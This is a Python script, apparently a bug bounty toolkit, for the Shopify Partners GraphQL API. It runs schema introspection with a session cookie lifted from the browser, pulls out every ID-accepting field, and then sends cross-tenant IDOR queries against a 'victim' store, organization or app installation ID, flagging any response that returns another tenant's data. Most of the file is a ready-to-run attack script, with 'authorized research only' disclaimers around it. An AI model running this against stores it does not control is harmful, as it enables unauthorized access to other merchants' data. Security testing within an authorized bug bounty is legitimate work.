#!/usr/bin/env python3
"""
Shopify Partners GraphQL Introspection & IDOR Testing Toolkit
For authorized bug bounty research only.
"""

import requests
import json
import sys
from typing import Optional, Dict, Any

class ShopifyPartnersAPI:
    """Client for Shopify Partners GraphQL API testing."""

    BASE_URL = "https://partners.shopify.com"
    GRAPHQL_ENDPOINT = "/api/graphql"

    def __init__(self, session_cookie: str, organization_id: str):
        """
        Initialize with authenticated session.

        Args:
            session_cookie: Full cookie string from authenticated browser session
            organization_id: Your partner organization ID (from URL)
        """
        self.session = requests.Session()
        self.session.headers.update({
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Security Research)",
        })
        self.session.headers["Cookie"] = session_cookie
        self.org_id = organization_id
        self.endpoint = f"{self.BASE_URL}/{organization_id}{self.GRAPHQL_ENDPOINT}"

    def query(self, graphql_query: str, variables: Optional[Dict] = None) -> Dict[str, Any]:
        """Execute a GraphQL query."""
        payload = {"query": graphql_query}
        if variables:
            payload["variables"] = variables

        response = self.session.post(self.endpoint, json=payload)
        return {
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": response.json() if response.text else None
        }

    def introspect_schema(self) -> Dict[str, Any]:
        """Fetch full GraphQL schema via introspection."""
        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              kind
              name
              description
              fields(includeDeprecated: true) {
                name
                description
                args {
                  name
                  type { kind name ofType { kind name } }
                }
                type { kind name ofType { kind name } }
              }
            }
          }
        }
        """
        return self.query(introspection_query)

    def find_id_parameters(self, schema: Dict) -> list:
        """Extract all fields that accept ID-type parameters."""
        id_fields = []

        if not schema.get("body", {}).get("data", {}).get("__schema"):
            return id_fields

        types = schema["body"]["data"]["__schema"]["types"]

        for t in types:
            if t["kind"] != "OBJECT" or not t.get("fields"):
                continue

            for field in t["fields"]:
                if not field.get("args"):
                    continue

                for arg in field["args"]:
                    arg_type = arg.get("type", {})
                    type_name = arg_type.get("name") or ""
                    oftype_name = (arg_type.get("ofType") or {}).get("name") or ""

                    if "ID" in type_name.upper() or "ID" in oftype_name.upper():
                        id_fields.append({
                            "type": t["name"],
                            "field": field["name"],
                            "arg": arg["name"],
                            "arg_type": type_name or oftype_name
                        })

        return id_fields


# =============================================================================
# IDOR Test Queries - Modify IDs to test cross-tenant access
# =============================================================================

IDOR_TEST_QUERIES = {
    "store_basic": """
        query TestStoreAccess($storeId: ID!) {
          store(id: $storeId) {
            id
            name
            myshopifyDomain
          }
        }
    """,

    "store_with_apps": """
        query TestStoreApps($storeId: ID!) {
          store(id: $storeId) {
            id
            name
            apps(first: 10) {
              edges {
                node {
                  id
                  name
                }
              }
            }
          }
        }
    """,

    "organization_stores": """
        query TestOrgStores($orgId: ID!) {
          organization(id: $orgId) {
            id
            name
            stores(first: 10) {
              edges {
                node {
                  id
                  name
                  myshopifyDomain
                }
              }
            }
          }
        }
    """,

    "app_installation": """
        query TestAppInstallation($installationId: ID!) {
          appInstallation(id: $installationId) {
            id
            app { name }
            store { name myshopifyDomain }
          }
        }
    """
}


def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║     SHOPIFY PARTNERS GRAPHQL IDOR TESTING TOOLKIT                ║
║     For authorized bug bounty research only                      ║
╚══════════════════════════════════════════════════════════════════╝
    """)


def print_usage():
    print("""
USAGE:
------
1. Export your session cookie from browser DevTools:
   - Log into partners.shopify.com
   - Open DevTools → Application → Cookies
   - Copy the full cookie string

2. Find your organization ID:
   - Look at URL: partners.shopify.com/XXXXXXX/...
   - The number after partners.shopify.com/ is your org ID

3. Run introspection:
   python graphql_introspection.py introspect <org_id> <cookie>

4. Run IDOR tests:
   python graphql_introspection.py test <org_id> <cookie> <victim_store_id>

EXAMPLES:
---------
# Introspect schema
python graphql_introspection.py introspect 1234567 "_shopify_partners_session=abc123..."

# Test IDOR with victim's store ID
python graphql_introspection.py test 1234567 "_shopify_partners_session=abc123..." "gid://partners/Store/9876543"
    """)


def run_introspection(org_id: str, cookie: str):
    """Run schema introspection and find ID parameters."""
    print(f"[*] Connecting to Partners API for org {org_id}...")

    api = ShopifyPartnersAPI(cookie, org_id)

    print("[*] Running GraphQL introspection...")
    schema = api.introspect_schema()

    if schema["status_code"] != 200:
        print(f"[!] Error: HTTP {schema['status_code']}")
        print(json.dumps(schema["body"], indent=2))
        return

    # Save full schema
    with open("schema_dump.json", "w") as f:
        json.dump(schema["body"], f, indent=2)
    print("[+] Full schema saved to schema_dump.json")

    # Find ID parameters
    print("\n[*] Extracting fields with ID parameters...")
    id_fields = api.find_id_parameters(schema)

    print(f"\n[+] Found {len(id_fields)} fields accepting ID parameters:\n")
    for field in id_fields:
        print(f"    {field['type']}.{field['field']}({field['arg']}: {field['arg_type']})")

    # Save ID fields
    with open("id_parameters.json", "w") as f:
        json.dump(id_fields, f, indent=2)
    print("\n[+] ID parameters saved to id_parameters.json")


def run_idor_tests(org_id: str, cookie: str, victim_store_id: str):
    """Run IDOR test queries against a target store ID."""
    print(f"[*] Running IDOR tests against store: {victim_store_id}")
    print("[!] REMINDER: Only test against stores YOU control\n")

    api = ShopifyPartnersAPI(cookie, org_id)
    results = []

    for test_name, query in IDOR_TEST_QUERIES.items():
        print(f"[*] Testing: {test_name}")

        # Determine variable name
        if "storeId" in query:
            variables = {"storeId": victim_store_id}
        elif "orgId" in query:
            variables = {"orgId": victim_store_id}  # Test org access too
        elif "installationId" in query:
            variables = {"installationId": victim_store_id}
        else:
            variables = {}

        response = api.query(query, variables)

        result = {
            "test": test_name,
            "target_id": victim_store_id,
            "status_code": response["status_code"],
            "has_data": bool(response.get("body", {}).get("data")),
            "has_errors": bool(response.get("body", {}).get("errors")),
            "response": response["body"]
        }
        results.append(result)

        # Analyze result
        if response["status_code"] == 200:
            body = response.get("body", {})

            if body.get("data") and not body.get("errors"):
                # Check if we got actual data (not null)
                data_values = list(body["data"].values())
                if any(v is not None for v in data_values):
                    print(f"    [!] POTENTIAL IDOR: Got data for foreign store!")
                    print(f"    Response: {json.dumps(body['data'], indent=4)[:500]}")
                else:
                    print(f"    [+] Access denied (null response)")
            elif body.get("errors"):
                error_msg = body["errors"][0].get("message", "Unknown error")
                print(f"    [+] Access denied: {error_msg[:100]}")
        else:
            print(f"    [+] HTTP {response['status_code']} - Access denied")

        print()

    # Save all results
    with open("idor_test_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print("[+] Full results saved to idor_test_results.json")

    # Summary
    potential_vulns = [r for r in results if r["has_data"] and not r["has_errors"]]
    if potential_vulns:
        print(f"\n[!!!] POTENTIAL VULNERABILITIES FOUND: {len(potential_vulns)}")
        print("Review idor_test_results.json and validate manually before reporting.")
    else:
        print("\n[+] No IDOR vulnerabilities detected in tested queries.")


if __name__ == "__main__":
    print_banner()

    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)

    command = sys.argv[1]

    if command == "introspect" and len(sys.argv) >= 4:
        run_introspection(sys.argv[2], sys.argv[3])
    elif command == "test" and len(sys.argv) >= 5:
        run_idor_tests(sys.argv[2], sys.argv[3], sys.argv[4])
    else:
        print_usage()
        sys.exit(1)
